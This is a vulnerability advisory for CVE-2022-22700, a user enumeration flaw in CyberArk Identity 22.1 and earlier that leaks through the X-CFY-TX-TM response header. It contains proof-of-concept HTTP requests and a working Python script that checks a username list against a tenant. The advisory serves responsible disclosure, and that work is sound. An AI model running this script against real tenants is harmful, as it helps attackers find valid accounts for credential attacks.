---
slug: advisories/porter/
title: CyberArk Identity 22.1 Vulnerability
authors: Andres Roldan
writer: aroldan
codename: porter
product: CyberArk Identity
date: 2022-02-15 12:00 COT
cveid: CVE-2022-22700
severity: 5.3
description: CyberArk Identity 22.1 User Enumeration
keywords: Fluid Attacks, Security, Vulnerabilities, CyberArk, Identity
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                         |                                                            |
|-------------------------|------------------------------------------------------------|
| **Name**                | CyberArk Identity 22.1 User Enumeration                    |
| **Code name**           | [Porter](https://en.wikipedia.org/wiki/Cole_Porter)        |
| **Product**             | CyberArk Identity                                          |
| **Affected versions**   | 22.1 and below                                             |
| **Fixed versions**      | 22.2                                                       |
| **State**               | Public                                                     |

## Vulnerability

|                       |                                                                  |
|-----------------------|------------------------------------------------------------------|
| **Kind**              | User Enumeration                                                 |
| **Rule**              | [225. Proper Authentication Responses](https://docs.fluidattacks.com/criteria/requirements/225)                                                          |
| **Remote**            | Yes                                                              |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N                     |
| **CVSSv3 Base Score** | 5.3                                                              |
| **Exploit available** | Yes                                                              |
| **CVE ID(s)**         | [CVE-2022-22700](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22700)                                                    |

## Description

CyberArk Identity versions up to and including 22.1 in the
`StartAuthentication` resource, exposes the response header `X-CFY-TX-TM`.
In certain configurations, that response header contains different, predictable
value ranges which can be used to determine wether a user exists in the tenant.

## Proof of Concept

- A request is sent with a known valid user

Request:

```json
POST /Security/StartAuthentication HTTP/1.1
Host: customer.my.idaptive.app
Content-Length: 143
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Content-Type: application/json

{"TenantId":"","User":"admin@customer.com","Version":"1.0","AssociatedEntityType":"Portal","AssociatedEntityName":"Portal","ZsoSessionId":""}
```

Response:

```json
HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Type: application/json; charset=utf-8
X-CFY-TX-TM: 109
...
```

In the cases when the user exists, the value of `X-CFY-TX-TM`
is always less than `500`.

- A request is sent with a non existent user

Request:

```json
POST /Security/StartAuthentication HTTP/1.1
Host: customer.my.idaptive.app
Content-Length: 147
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Content-Type: application/json

{"TenantId":"","User":"notexists@customer.com","Version":"1.0","AssociatedEntityType":"Portal","AssociatedEntityName":"Portal","ZsoSessionId":""}
```

Response:

```json
HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Type: application/json; charset=utf-8
X-CFY-TX-TM: 1492
...
```

In the cases when the user does not exist, the value of `X-CFY-TX-TM`
is always above than `1000`.

## Exploit

The following code was used to enumerate valid users:

```python
#!/usr/bin/env python
#
# Author: aroldan@fluidattacks.com

import json
import requests
import sys

URL = 'https://<customer>.my.idaptive.app/Security/StartAuthentication'
RAW_DATA =  '{"TenantId":"","User":"test@customer.com","Version":"1.0","AssociatedEntityType":"Portal","AssociatedEntityName":"Portal","ZsoSessionId":""}'
JSON_DATA = json.loads(RAW_DATA)

with open(sys.argv[1], 'r') as fd:
    USERS = [x.rstrip() for x in fd.readlines()]

for USER in USERS:
    VALUE = 10000
    PAYLOAD = JSON_DATA
    PAYLOAD['User'] = USER
    RESP = requests.post(URL, json=PAYLOAD)
    if 'X-CFY-TX-TM' in RESP.headers:
        VALUE = int(RESP.headers['X-CFY-TX-TM'])
    if VALUE < 1000:
        print(VALUE)
        print(f'[+] User {USER} exists.')
    else:
        print(f'[-] User {USER} not exists.')
```

## Credits

The vulnerability was discovered by [Andrés
Roldán](https://www.linkedin.com/in/andres-roldan/) from the Offensive
Team of  `Fluid Attacks`.

## References

|                     |                                                                     |
|---------------------|---------------------------------------------------------------------|
| **Vendor page**     | <https://www.cyberark.com/resources/cyberark-identity/>                                     |
| **Changelog**     | <https://docs.cyberark.com/Product-Doc/OnlineHelp/Idaptive/Latest/en/Content/ReleaseNotes/ReleaseNotes-Latest.htm>                                     |

## Timeline

- 2021-09-28: Vulnerability discovered in customer engagement.

- 2021-09-29: Customer notified of vulnerability.

- 2022-01-21: Customer approval to contact vendor.

- 2022-02-05: Vendor contacted.

- 2022-02-16: Vendor asked for more information.

- 2022-02-25: Version 22.2 released with fix.

- 2022-02-28: Vendor confirmed patch.